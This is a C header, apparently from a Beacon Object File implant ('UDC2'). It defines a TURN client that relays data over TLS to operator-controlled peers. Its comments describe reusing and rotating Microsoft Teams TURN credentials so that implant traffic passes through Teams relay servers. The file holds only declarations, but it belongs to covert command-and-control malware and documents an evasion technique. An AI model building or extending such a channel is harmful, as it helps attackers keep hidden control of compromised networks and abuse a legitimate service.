// turn.h — a minimal RFC 5766 TURN client (UDP allocation, Send/Data
// indications) over the schannel TLS transport, for the UDC2 BOF.
#ifndef BOF_TURN_H
#define BOF_TURN_H

#include "dfr.h"
#include "schannel.h"
#include "msteams.h"

typedef struct _TURN_CTX {
    SOCKET sock;
    TLS_CTX tls;
    BOOL alive;

    // Long-term credentials. Seeded from the build-time config, then
    // rotated at runtime from Microsoft Teams before they expire (Teams
    // TURN credentials live ~7 days; a TURN allocation accepts refreshes
    // with any currently-valid credential pair).
    char username[192];
    char password[128];
    unsigned long long credExpires; // unix seconds; 0 = unknown
    BOOL credInit;                  // username/password seeded

    struct sockaddr_in server;      // resolved TURN server (TURNS)
    struct sockaddr_in peers[4];    // operator relayed addresses (usually 1)
    int peerCount;
    struct sockaddr_in relay;       // our relayed address

    char realm[128];
    unsigned long realmLen;
    char nonce[128];
    unsigned long nonceLen;
    unsigned char key[16];          // MD5(username ":" realm ":" password)

    unsigned long long lastOk;      // tick of last successful transaction
} TURN_CTX;

// Connects (TCP+TLS), allocates a relay and installs a permission for the
// first configured peer. Returns 0 on success.
int turn_connect(TURN_CTX* t, unsigned long long deadline);

// Refreshes the allocation and permission when they have gone stale.
// Returns 0 on success (including "not stale").
int turn_keepalive(TURN_CTX* t, unsigned long long deadline);

// Sends one application data packet to the first peer as a Send
// indication (fire-and-forget).
int turn_send_data(TURN_CTX* t, const unsigned char* data, unsigned short len);

// Reads one application data packet (Data indication or ChannelData).
// Returns 1 with *outLen set, 0 on deadline, -1 on error.
int turn_recv_data(TURN_CTX* t, unsigned char* out, unsigned long cap,
                   unsigned long* outLen, unsigned long long deadline);

// Tears the connection down. With polite=TRUE, sends Refresh(lifetime=0)
// to release the allocation.
void turn_teardown(TURN_CTX* t, int polite);

#endif
